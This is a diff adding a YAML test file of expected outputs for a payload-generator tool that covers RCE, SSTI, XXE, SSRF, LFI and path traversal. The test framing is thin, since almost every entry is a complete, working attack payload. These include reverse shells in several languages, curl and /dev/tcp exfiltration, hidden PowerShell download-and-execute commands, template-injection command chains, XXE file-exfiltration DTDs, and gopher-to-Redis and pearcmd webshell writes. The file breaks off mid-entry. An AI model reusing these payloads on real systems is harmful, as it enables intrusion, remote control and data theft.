@@ -1,0 +1,926 @@
+# 服务端注入类扩充的黄金样本（rce / ssti / xxe / ssrf / lfi / traversal）。
+#
+# 期望值一律**手推**：读数据里的 body，按管线的顺序逐层套——
+#   槽位填充（默认值也算）→ 变量替换（含 <<len>>/<<select>>/<<rep>>）→ 按序绕过 → 传输编码
+# 没有一份是跑一遍工具粘回来的。凡是推不出确切结果的（比如未填的变量），
+# 就断言那个「原样透传」的形态，而不是断言一个看起来合理的值。
+#
+# 注意 `--vuln rce` 这类要带上 content-type，否则默认的 sql-expression 会把模板全过滤掉。
+
+ruleDB: v0.1.0
+
+samples:
+  # ======================================================================
+  # RCE · Linux · 反弹 Shell（解释器更多的那一档）
+  # ======================================================================
+
+  - name: Perl 反弹 shell · 默认分隔符与默认 shell
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.reverse.perl_tcp
+      vars: {lhost: "10.0.0.1", lport: "4444"}
+      outputs: [raw]
+    expect:
+      # sep 取默认 ";"，sh 取默认 "/bin/sh"；单引号包住整段 Perl，里面的双引号原样保留
+      payload: |-
+        ;perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+  - name: Perl 反弹 shell · 换分隔符与 shell
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.reverse.perl_tcp
+      slots: {sep: "&&", sh: "/bin/bash"}
+      vars: {lhost: "192.168.1.10", lport: "9001"}
+      outputs: [raw]
+    expect:
+      payload: |-
+        &&perl -e 'use Socket;$i="192.168.1.10";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
+
+  - name: Ruby 反弹 shell
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.reverse.ruby_socket
+      vars: {lhost: "10.0.0.1", lport: "4444"}
+      outputs: [raw]
+    expect:
+      # lport 在 body 里没有引号包着，直接落进 Ruby 的数字字面量
+      payload: |-
+        ;ruby -rsocket -e 'f=TCPSocket.open("10.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+  - name: PHP 反弹 shell
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.reverse.php
+      vars: {lhost: "10.0.0.1", lport: "4444"}
+      outputs: [raw]
+    expect:
+      payload: |-
+        ;php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+  - name: Lua 反弹 shell
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.reverse.lua
+      vars: {lhost: "10.0.0.1", lport: "4444"}
+      outputs: [raw]
+    expect:
+      payload: |-
+        ;lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','4444');os.execute('/bin/sh -i <&3 >&3 2>&3');"
+
+  - name: Gawk 反弹 shell
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.reverse.awk
+      vars: {lhost: "10.0.0.1", lport: "4444"}
+      outputs: [raw]
+    expect:
+      # `$0` 和 `|&` 都是 awk 自己的语法，工具不碰它们
+      payload: |-
+        ;awk 'BEGIN{s="/inet/tcp/0/10.0.0.1/4444";while(1){do{s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!="exit")}}'
+
+  - name: Telnet 反弹 shell · 管道文件换到 /dev/shm
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.reverse.telnet
+      slots: {f: "/dev/shm/f"}
+      vars: {lhost: "10.0.0.1", lport: "4444"}
+      outputs: [raw]
+    expect:
+      # f 出现三次，三处都要跟着换；rm -f 在最前面清掉上一次的残留
+      payload: ";rm -f /dev/shm/f;mkfifo /dev/shm/f;cat /dev/shm/f|/bin/sh -i 2>&1|telnet 10.0.0.1 4444 >/dev/shm/f"
+
+  - name: Node.js 反弹 shell
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.reverse.node
+      vars: {lhost: "10.0.0.1", lport: "4444"}
+      outputs: [raw]
+    expect:
+      payload: |-
+        ;node -e "(function(){var net=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/sh',[]);var c=new net.Socket();c.connect(4444,'10.0.0.1',function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});return /a/;})()"
+
+  # ======================================================================
+  # RCE · Linux · 关键字绕过与空格绕过
+  # ======================================================================
+
+  - name: 通配符绕关键字 · 默认档
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.bypass.glob
+      outputs: [raw]
+    expect:
+      payload: ";/???/??t /???/p??s??"
+
+  - name: 通配符绕关键字 · 换成 cat /flag.txt
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.bypass.glob
+      slots: {form: "cat_flag"}
+      outputs: [raw]
+    expect:
+      # 取的是字典选项的 raw 字段，不是 id，也不是 name
+      payload: ";/???/??t /????.txt"
+
+  - name: 引号穿插绕关键字 · 默认档
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.bypass.keyword.quote
+      outputs: [raw]
+    expect:
+      # form.seq=c'a't, ifs=" "（默认就是一个空格）, target=/etc/passwd
+      payload: ";c'a't /etc/passwd"
+
+  - name: 引号穿插绕关键字 · 反斜杠 + $IFS
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.bypass.keyword.quote
+      slots: {form: "backslash", ifs: "$IFS", target: "/flag"}
+      outputs: [raw]
+    expect:
+      # form.seq 在数据里写的是 "c\\at"（双引号标量），解析后就是 c\at
+      payload: ';c\at$IFS/flag'
+
+  - name: 变量拼接绕关键字
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.bypass.keyword.var
+      outputs: [raw]
+    expect:
+      # body 里分号是写死的（a=c;b=at 必须是两条独立语句），只有最前面的分隔符走槽位
+      payload: ";a=c;b=at;$a$b /etc/passwd"
+
+  - name: $IFS 拼 bash -c
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.bypass.ifs.bash
+      outputs: [raw]
+    expect:
+      # 两个 ${IFS} 都是默认值；命令体在单引号里，自带的空格不受影响
+      payload: ";bash${IFS}-c${IFS}'whoami'"
+
+  - name: herestring 喂给解释器
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.subst.herestring
+      vars: {cmd: "id"}
+      outputs: [raw]
+    expect:
+      # `<<<` 是 herestring 运算符，后面紧跟的 `'` 是 shell 的引号——不是占位符边界
+      payload: ";bash<<<'id'"
+
+  # ======================================================================
+  # RCE · Linux · 无回显带外
+  # ======================================================================
+
+  - name: /dev/tcp 带外
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.blind.devtcp
+      vars: {lhost: "10.0.0.1", lport: "4444"}
+      outputs: [raw]
+    expect:
+      payload: ";whoami > /dev/tcp/10.0.0.1/4444"
+
+  - name: ICMP 带外
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.blind.icmp
+      vars: {cmd: "id", domain: "oob.example.com"}
+      outputs: [raw]
+    expect:
+      # 命令替换里没有额外的引号，原样落进 ping -p 的参数位置
+      payload: ";ping -c 1 -p $(id|xxd -p|head -c 32) oob.example.com"
+
+  - name: HTTP POST 带外
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.blind.oob.post
+      vars: {cmd: "id", lhost: "10.0.0.1"}
+      outputs: [raw]
+    expect:
+      # enc 取默认 "base64 -w0"，落在 `cmd | enc` 的第二个位置
+      payload: |-
+        ;curl -s -X POST --data "$(id | base64 -w0)" http://10.0.0.1/
+
+  # ======================================================================
+  # RCE · Windows · LOLBin
+  # ======================================================================
+
+  - name: mshta 执行远程 HTA
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.windows.lolbin.mshta
+      vars: {lhost: "10.0.0.1", file: "a.hta"}
+      outputs: [raw]
+    expect:
+      payload: "&mshta http://10.0.0.1/a.hta"
+
+  - name: "rundll32 经 javascript: 执行"
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.windows.lolbin.rundll32
+      vars: {cmd: "calc.exe"}
+      outputs: [raw]
+    expect:
+      # `\..\mshtml` 里的反斜杠是载荷的一部分，工具不转义；RunHTMLApplication 后面那个空格也在
+      payload: |-
+        &rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new ActiveXObject("WScript.Shell").Run("calc.exe")
+
+  - name: regsvr32 远程执行 SCT
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.windows.lolbin.regsvr32
+      vars: {lhost: "10.0.0.1", file: "a.sct"}
+      outputs: [raw]
+    expect:
+      payload: "&regsvr32 /s /n /u /i:http://10.0.0.1/a.sct scrobj.dll"
+
+  - name: wmic 起进程
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.windows.lolbin.wmic
+      outputs: [raw]
+    expect:
+      payload: |-
+        &wmic process call create "cmd.exe /c whoami"
+
+  - name: forfiles 代执行
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.windows.lolbin.forfiles
+      outputs: [raw]
+    expect:
+      payload: |-
+        &forfiles /p c:\windows\system32 /m notepad.exe /c "cmd /c whoami"
+
+  - name: pcalua 代启动程序
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.windows.lolbin.pcalua
+      vars: {filepath: 'C:\Windows\Temp\a.exe'}
+      outputs: [raw]
+    expect:
+      payload: |-
+        &pcalua -a C:\Windows\Temp\a.exe
+
+  # ======================================================================
+  # RCE · Windows · 下载执行
+  # ======================================================================
+
+  - name: PowerShell 下载 · iwr 别名（默认档）
+    state:
+      vuln: rce
+      content_type: powershell-command
+      template: rce.windows.powershell.download.alias
+      vars: {lhost: "10.0.0.1", file: "a.exe"}
+      outputs: [raw]
+    expect:
+      # dl.raw 里的 `\\<<file>>` 在 YAML 里解析成 `\<<file>>`，替换后是 `\a.exe`
+      payload: |-
+        &powershell -nop -w hidden -c "iwr http://10.0.0.1/a.exe -OutFile $env:TEMP\a.exe; & $env:TEMP\a.exe"
+
+  - name: PowerShell 下载 · curl 别名
+    state:
+      vuln: rce
+      content_type: powershell-command
+      template: rce.windows.powershell.download.alias
+      slots: {tool: "curl_alias"}
+      vars: {lhost: "10.0.0.1", file: "a.exe"}
+      outputs: [raw]
+    expect:
+      payload: |-
+        &powershell -nop -w hidden -c "curl http://10.0.0.1/a.exe -OutFile $env:TEMP\a.exe; & $env:TEMP\a.exe"
+
+  - name: ftp 内置客户端下载
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.windows.download.ftp
+      vars: {lhost: "10.0.0.1", file: "a.exe"}
+      outputs: [raw]
+    expect:
+      # 中间的 `&&` 是写死的（FTP 脚本必须逐行追加），只有最前面的分隔符走槽位
+      payload: |-
+        &echo open 10.0.0.1 > %TEMP%\f.txt && echo anonymous >> %TEMP%\f.txt && echo x >> %TEMP%\f.txt && echo binary >> %TEMP%\f.txt && echo get a.exe >> %TEMP%\f.txt && echo bye >> %TEMP%\f.txt && ftp -s:%TEMP%\f.txt
+
+  - name: PowerShell 脚本块加载（免杀写法）
+    state:
+      vuln: rce
+      content_type: powershell-command
+      template: rce.windows.powershell.scriptblock
+      vars: {lhost: "10.0.0.1", file: "a.ps1"}
+      outputs: [raw]
+    expect:
+      payload: |-
+        &powershell -nop -w hidden -c "& {$c=New-Object Net.WebClient;$c.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)');IEX $c.DownloadString('http://10.0.0.1/a.ps1')}"
+
+  # ======================================================================
+  # SSTI · Jinja2
+  # ======================================================================
+
+  - name: Jinja2 用 selectattr 定位类（免下标）
+    state:
+      vuln: ssti
+      template: ssti.jinja2.rce.subclasses.selectattr
+      vars: {cmd: "id"}
+      outputs: [raw]
+    expect:
+      payload: "{{''.__class__.__base__.__subclasses__()|selectattr('__name__','equalto','_wrap_close')|first|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}"
+      syntax: ok
+
+  - name: Jinja2 经 attr 与下标混用
+    state:
+      vuln: ssti
+      template: ssti.jinja2.rce.attr.mixed
+      vars: {cmd: "id"}
+      outputs: [raw]
+    expect:
+      # idx 取默认 "0"，所以是 `)[0]`
+      payload: "{{(((''|attr('__class__')|attr('__base__')|attr('__subclasses__')())[0]|attr('__init__')|attr('__globals__'))['os']|attr('popen')('id')|attr('read')())}}"
+      syntax: ok
+
+  - name: Jinja2 用 {% print %} 输出
+    state:
+      vuln: ssti
+      template: ssti.jinja2.stmt.print
+      vars: {cmd: "id"}
+      outputs: [raw]
+    expect:
+      payload: "{% print(cycler.__init__.__globals__.os.popen('id').read()) %}"
+      syntax: ok
+
+  - name: Jinja2 用 join 过滤器拼关键字
+    state:
+      vuln: ssti
+      template: ssti.jinja2.rce.join
+      vars: {cmd: "id"}
+      outputs: [raw]
+    expect:
+      # 三处 join 拼出 __globals__ / os / popen / read，载荷里没有完整关键字
+      payload: "{{lipsum|attr(['__','globals','__']|join)|attr('__getitem__')(['o','s']|join)|attr(['po','pen']|join)('id')|attr(['re','ad']|join)()}}"
+      syntax: ok
+
+  # ======================================================================
+  # SSTI · Java 系
+  # ======================================================================
+
+  - name: Velocity 经 class.inspect 命令执行
+    state:
+      vuln: ssti
+      template: ssti.java.velocity.inspect
+      vars: {cmd: "id"}
+      outputs: [raw]
+    expect:
+      payload: |-
+        #set($e=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))$e.waitFor()
+
+  - name: SpEL 经 Class.forName（T() 被禁时）
+    state:
+      vuln: ssti
+      template: ssti.java.spel.forname
+      vars: {cmd: "id"}
+      outputs: [raw]
+    expect:
+      # 载荷里没有 `T(`，靠 ''.getClass() 拿 Class 再调静态方法
+      payload: "${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}"
+
+  - name: SpEL 经 new ProcessBuilder 命令执行
+    state:
+      vuln: ssti
+      template: ssti.java.spel.new
+      vars: {cmd: "id"}
+      outputs: [raw]
+    expect:
+      payload: |-
+        ${new java.lang.ProcessBuilder(new String[]{"/bin/sh","-c","id"}).start()}
+
+  - name: Freemarker 经 ObjectConstructor 命令执行
+    state:
+      vuln: ssti
+      template: ssti.java.freemarker.object_constructor
+      vars: {cmd: "id"}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <#assign oc="freemarker.template.utility.ObjectConstructor"?new()>${oc("java.lang.ProcessBuilder","id").start()}
+
+  - name: Groovy 经 ProcessBuilder 命令执行
+    state:
+      vuln: ssti
+      template: ssti.java.groovy.processbuilder
+      vars: {cmd: "id"}
+      outputs: [raw]
+    expect:
+      # Groovy 的 `[...]` 是 List 字面量，正好喂给 ProcessBuilder(List) 那个构造器
+      payload: |-
+        ${new java.lang.ProcessBuilder(["/bin/sh","-c","id"]).start().inputStream.text}
+
+  - name: Thymeleaf 内联表达式命令执行
+    state:
+      vuln: ssti
+      template: ssti.java.thymeleaf.inline
+      vars: {cmd: "id"}
+      outputs: [raw]
+    expect:
+      payload: '[[${T(java.lang.Runtime).getRuntime().exec("id")}]]'
+
+  # ======================================================================
+  # SSTI · Python / Ruby / Node / PHP
+  # ======================================================================
+
+  - name: Mako 经 self.module 命令执行
+    state:
+      vuln: ssti
+      template: ssti.python.mako.rce.self_module
+      vars: {cmd: "id"}
+      outputs: [raw]
+    expect:
+      payload: "${self.module.cache.util.os.popen('id').read()}"
+
+  - name: Mako 模块级代码块
+    state:
+      vuln: ssti
+      template: ssti.python.mako.module_level
+      vars: {cmd: "id"}
+      outputs: [raw]
+    expect:
+      # `<%!from os import popen%>` 是模块级代码块，模板体里只出现 popen
+      payload: "<%!from os import popen%>${popen('id').read()}"
+
+  - name: Django 经 include 加载任意模板
+    state:
+      vuln: ssti
+      template: ssti.python.django.include
+      vars: {filepath: "/app/templates/uploaded.html"}
+      outputs: [raw]
+    expect:
+      payload: |-
+        {% include "/app/templates/uploaded.html" %}
+
+  - name: ERB 经 IO.popen 命令执行
+    state:
+      vuln: ssti
+      template: ssti.ruby.erb.rce.io_popen
+      vars: {cmd: "id"}
+      outputs: [raw]
+    expect:
+      payload: '<%= IO.popen("id").readlines.join %>'
+
+  - name: Handlebars 经 lookup/constructor 命令执行
+    state:
+      vuln: ssti
+      template: ssti.node.handlebars.rce
+      vars: {cmd: "id"}
+      outputs: [raw]
+    expect:
+      # 整条链只有内建助手；命令落在 push 进去的那段 JS 字符串里
+      payload: |-
+        {{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('id');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
+
+  - name: Twig 经 _self.env 命令执行
+    state:
+      vuln: ssti
+      template: ssti.php.twig.rce.self_env
+      vars: {cmd: "id"}
+      outputs: [raw]
+    expect:
+      payload: "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}"
+
+  - name: Smarty {php} 标签命令执行
+    state:
+      vuln: ssti
+      template: ssti.php.smarty.rce.php_tag
+      vars: {cmd: "id"}
+      outputs: [raw]
+    expect:
+      # 标签体里是原样 PHP，不写 <?php —— Smarty 自己会包
+      payload: '{php}system("id");{/php}'
+
+  # ======================================================================
+  # XXE · 换载体
+  # ======================================================================
+
+  - name: SVG 上传触发 XXE
+    state:
+      vuln: xxe
+      template: xxe.generic.svg
+      vars: {filepath: "/etc/passwd"}
+      outputs: [raw]
+    expect:
+      # 多行文档按行比对，末尾不带换行（数据里用的是 |-）
+      payload: |-
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+        <svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
+          <text x="10" y="20">&xxe;</text>
+        </svg>
+      syntax: ok
+
+  - name: DOCX / XLSX 导入触发 XXE
+    state:
+      vuln: xxe
+      template: xxe.generic.docx
+      vars: {filepath: "C:/Windows/win.ini"}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://C:/Windows/win.ini">]>
+        <w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
+        <w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body>
+        </w:document>
+      syntax: ok
+
+  - name: XXE 经 expect:// 执行命令
+    state:
+      vuln: xxe
+      template: xxe.generic.expect
+      vars: {command: "id"}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
+        <foo>&xxe;</foo>
+      syntax: ok
+
+  # ======================================================================
+  # XXE · 外部 DTD 外带（三件套的第 ② 件）
+  # ======================================================================
+
+  - name: 外部 DTD · HTTP 外带（默认 php://filter 包装）
+    state:
+      vuln: xxe
+      template: xxe.generic.oob.exfil.dtd
+      vars: {filepath: "/etc/passwd", lhost: "10.0.0.1"}
+      outputs: [raw]
+    expect:
+      # w.prefix 是**整个** scheme 段，body 里不再补 file://
+      # 它是 DTD 片段而不是完整 XML 文档，所以 xml 校验必然报失败——这是预期的
+      payload: |-
+        <!ENTITY % f SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+        <!ENTITY % e "<!ENTITY &#x25; send SYSTEM 'http://10.0.0.1/?%f;'>">
+        %e;
+        %send;
+      syntax: fail
+
+  - name: 外部 DTD · HTTP 外带（直接 file://）
+    state:
+      vuln: xxe
+      template: xxe.generic.oob.exfil.dtd
+      slots: {w: "plain"}
+      vars: {filepath: "/etc/hostname", lhost: "10.0.0.1"}
+      outputs: [raw]
+    expect:
+      # plain 档的前缀是 "file://"，和以 / 开头的路径拼起来正好三个斜杠
+      payload: |-
+        <!ENTITY % f SYSTEM "file:///etc/hostname">
+        <!ENTITY % e "<!ENTITY &#x25; send SYSTEM 'http://10.0.0.1/?%f;'>">
+        %e;
+        %send;
+      syntax: fail
+
+  - name: 外部 DTD · FTP 外带
+    state:
+      vuln: xxe
+      template: xxe.generic.oob.exfil.ftp
+      vars: {filepath: "/etc/passwd", lhost: "10.0.0.1"}
+      outputs: [raw]
+    expect:
+      # 和 HTTP 版的差别只在实体 %e 里的 scheme；%f 的取法完全一样
+      payload: |-
+        <!ENTITY % f SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+        <!ENTITY % e "<!ENTITY &#x25; send SYSTEM 'ftp://10.0.0.1/%f;'>">
+        %e;
+        %send;
+      syntax: fail
+
+  # ======================================================================
+  # SSRF · 协议族与内网服务
+  # ======================================================================
+
+  - name: SSRF 云元数据 · AWS user-data
+    state:
+      vuln: ssrf
+      template: ssrf.generic.cloud.metadata
+      slots: {target: "aws_userdata"}
+      outputs: [raw]
+    expect:
+      # body 就是 <<target.url>>，取的是字典选项的 url 字段
+      payload: "http://169.254.169.254/latest/user-data"
+
+  - name: SSRF 云元数据 · Scaleway（换了个地址）
+    state:
+      vuln: ssrf
+      template: ssrf.generic.cloud.metadata
+      slots: {target: "scaleway"}
+      outputs: [raw]
+    expect:
+      payload: "http://169.254.42.42/conf?format=json"
+
+  - name: SSRF 云元数据 · 默认档没被新选项动过
+    state:
+      vuln: ssrf
+      template: ssrf.generic.cloud.metadata
+      outputs: [raw]
+    expect:
+      payload: "http://169.254.169.254/latest/meta-data/"
+
+  - name: SSRF 冷门协议 · ldap
+    state:
+      vuln: ssrf
+      template: ssrf.generic.scheme.misc
+      vars: {rhost: "10.1.1.5", rport: "389"}
+      outputs: [raw]
+    expect:
+      payload: "ldap://10.1.1.5:389/"
+
+  - name: SSRF 冷门协议 · netdoc（不走 host，只吃路径）
+    state:
+      vuln: ssrf
+      template: ssrf.generic.scheme.misc
+      slots: {target: "netdoc"}
+      vars: {filepath: "/etc/passwd"}
+      outputs: [raw]
+    expect:
+      # 选 netdoc 时 rhost/rport 没被填也不会泄漏进载荷——替换只发生在被选中的那个选项上
+      payload: "netdoc:///etc/passwd"
+
+  - name: SSRF 冷门协议 · jar（Java 专有，`!/` 结尾）
+    state:
+      vuln: ssrf
+      template: ssrf.generic.scheme.misc
+      slots: {target: "jar"}
+      vars: {rhost: "10.1.1.5", rport: "8080", file: "x.jar"}
+      outputs: [raw]
+    expect:
+      payload: "jar:http://10.1.1.5:8080/x.jar!/"
+
+  - name: SSRF 打内网服务 · Elasticsearch 列索引
+    state:
+      vuln: ssrf
+      template: ssrf.generic.internal.services
+      vars: {rhost: "10.1.1.7"}
+      outputs: [raw]
+    expect:
+      payload: "http://10.1.1.7:9200/_cat/indices?v"
+
+  - name: SSRF 打内网服务 · Docker API
+    state:
+      vuln: ssrf
+      template: ssrf.generic.internal.services
+      slots: {target: "docker"}
+      vars: {rhost: "10.1.1.7"}
+      outputs: [raw]
+    expect:
+      payload: "http://10.1.1.7:2375/containers/json"
+
+  - name: SSRF gopher 打 Memcached · 先确认能通
+    state:
+      vuln: ssrf
+      template: ssrf.generic.gopher.memcached
+      outputs: [raw]
+    expect:
+      # 端口取默认 11211；内联命令后面必须跟 CRLF，gopher 里写成 %0D%0A
+      payload: "gopher://127.0.0.1:11211/_stats%0D%0A"
+
+  - name: SSRF gopher 打 Memcached · 按 key 取值
+    state:
+      vuln: ssrf
+      template: ssrf.generic.gopher.memcached
+      slots: {cmd: "get"}
+      vars: {key: "session:abc"}
+      outputs: [raw]
+    expect:
+      # 命令里的引号写成 %22，空格写成 %20，都留在 URL 里等目标端解码
+      payload: "gopher://127.0.0.1:11211/_get%20%22session:abc%22%0D%0A"
+
+  - name: SSRF gopher 经 Redis 写 WebShell
+    state:
+      vuln: ssrf
+      template: ssrf.generic.gopher.redis.webshell
+      outputs: [raw]
+    expect:
+      # 分号、问号、方括号、$ 全都要编码；四段命令各自以 %0D%0A 结尾
+      payload: "gopher://127.0.0.1:6379/_config%20set%20dir%20/var/www/html%0D%0Aconfig%20set%20dbfilename%20shell.php%0D%0Aset%20x%20%22%3C%3Fphp%20system(%24_GET%5B1%5D)%3B%3F%3E%22%0D%0Asave%0D%0A"
+
+  - name: SSRF gopher 经 Redis 写 WebShell · 换 Web 根与文件名
+    state:
+      vuln: ssrf
+      template: ssrf.generic.gopher.redis.webshell
+      slots: {webroot: "tomcat", ext: "phtml"}
+      outputs: [raw]
+    expect:
+      payload: "gopher://127.0.0.1:6379/_config%20set%20dir%20/usr/local/tomcat/webapps/ROOT%0D%0Aconfig%20set%20dbfilename%20shell.phtml%0D%0Aset%20x%20%22%3C%3Fphp%20system(%24_GET%5B1%5D)%3B%3F%3E%22%0D%0Asave%0D%0A"
+
+  # ======================================================================
+  # LFI
+  # ======================================================================
+
+  - name: /proc/self/fd/ 包含已打开的文件
+    state:
+      vuln: lfi
+      template: lfi.generic.proc.fd
+      vars: {n: "3"}
+      outputs: [raw]
+    expect:
+      # fd 号是变量不是槽位，没有默认值——漏填就原样留着 <<n>>
+      payload: "/proc/self/fd/3"
+
+  - name: /proc/self/imgline 读进程启动参数
+    state:
+      vuln: lfi
+      template: lfi.generic.proc.cmdline
+      outputs: [raw]
+    expect:
+      payload: "/proc/self/cmdline"
+
+  - name: session.upload_progress 写会话再包含
+    state:
+      vuln: lfi
+      template: lfi.generic.session.upload_progress
+      vars: {sid: "attacker"}
+      outputs: [raw]
+    expect:
+      # 默认档是 tmp（PHP 默认 save_path 为空，落在 /tmp）
+      payload: "/tmp/sess_attacker"
+
+  - name: session.upload_progress · 换到 Debian 的 save_path
+    state:
+      vuln: lfi
+      template: lfi.generic.session.upload_progress
+      slots: {sess: "debian"}
+      vars: {sid: "attacker"}
+      outputs: [raw]
+    expect:
+      payload: "/var/lib/php/sessions/sess_attacker"
+
+  - name: php://filter zlib 链 · deflate
+    state:
+      vuln: lfi
+      template: lfi.generic.filter.zlib
+      vars: {file: "/var/www/html/index.php"}
+      outputs: [raw]
+    expect:
+      # w.f 取默认 zlib.deflate；它是单条过滤器，所以后面直接跟 /resource=
+      payload: "php://filter/zlib.deflate/resource=/var/www/html/index.php"
+
+  - name: php://filter zlib 链 · deflate 后再 base64
+    state:
+      vuln: lfi
+      template: lfi.generic.filter.zlib
+      slots: {w: "deflate_base64"}
+      vars: {file: "/var/www/html/config.php"}
+      outputs: [raw]
+    expect:
+      # 两条过滤器用 | 连接，读的方向是「先 deflate 再 base64」
+      payload: "php://filter/zlib.deflate|convert.base64-encode/resource=/var/www/html/config.php"
+
+  - name: pearcmd.php 写文件再包含
+    state:
+      vuln: lfi
+      template: lfi.generic.pearcmd
+      vars: {file: "x.php"}
+      outputs: [raw]
+    expect:
+      # 参数是拼在 ?file= 后面的，所以用 `&+` 起一组新的位置参数；`+` 是空格的 URL 编码
+      payload: |-
+        /usr/local/lib/php/pearcmd.php&+config-create+/<?=eval($_GET[1]);?>+/tmp/x.php
+
+  - name: pearcmd.php · Debian 的 pear 路径
+    state:
+      vuln: lfi
+      template: lfi.generic.pearcmd
+      slots: {target: "debian"}
+      vars: {file: "x.php"}
+      outputs: [raw]
+    expect:
+      payload: |-
+        /usr/share/php/pearcmd.php&+config-create+/<?=eval($_GET[1]);?>+/tmp/x.php
+
+  - name: 邮件日志包含
+    state:
+      vuln: lfi
+      template: lfi.generic.log.mail
+      outputs: [raw]
+    expect:
+      payload: "/var/log/mail.log"
+
+  - name: FTP 日志包含 · 走 PAM 认证日志
+    state:
+      vuln: lfi
+      template: lfi.generic.log.ftp
+      slots: {log: "auth"}
+      outputs: [raw]
+    expect:
+      # auth 档和 lfi.generic.log.ssh 的 Debian 档指同一个文件，两条互为替代
+      payload: "/var/log/auth.log"
+
+  # ======================================================================
+  # 路径穿越
+  # ======================================================================
+
+  - name: 过长 UTF-8 编码穿越 · 点和斜杠都过长
+    state:
+      vuln: traversal
+      template: traversal.generic.overlong.utf8
+      vars: {filepath: "etc/passwd"}
+      outputs: [raw]
+    expect:
+      # depth 取默认 3，所以 seq 重复三次
+      payload: "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd"
+
+  - name: 过长 UTF-8 编码穿越 · 两层 + 只有斜杠过长
+    state:
+      vuln: traversal
+      template: traversal.generic.overlong.utf8
+      slots: {form: "slash_only", depth: "2"}
+      vars: {filepath: "etc/shadow"}
+      outputs: [raw]
+    expect:
+      # seq 是 "..%c0%af"，重复两次
+      payload: "..%c0%af..%c0%afetc/shadow"
+
+  - name: 16 位 Unicode 编码穿越 · IIS %u2215
+    state:
+      vuln: traversal
+      template: traversal.generic.unicode
+      vars: {filepath: "windows/win.ini"}
+      outputs: [raw]
+    expect:
+      payload: "..%u2215..%u2215..%u2215windows/win.ini"
+
+  - name: 16 位 Unicode 编码穿越 · 全角形态
+    state:
+      vuln: traversal
+      template: traversal.generic.unicode
+      slots: {form: "fullwidth", depth: "2"}
+      vars: {filepath: "windows/win.ini"}
+      outputs: [raw]
+    expect:
+      # %uff0e 是全角句点、%uff0f 是全角斜杠，靠应用的 NFKC 归一化折叠回 ../
+      payload: "%uff0e%uff0e%uff0f%uff0e%uff0e%uff0fwindows/win.ini"
+
+  - name: 多层编码混排穿越
+    state:
+      vuln: traversal
+      template: traversal.generic.encoded.multi
+      vars: {filepath: "etc/passwd"}
+      outputs: [raw]
+    expect:
